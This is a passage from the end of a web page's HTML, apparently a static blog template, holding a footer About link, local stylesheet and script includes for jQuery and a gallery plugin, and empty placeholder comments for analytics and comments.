         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


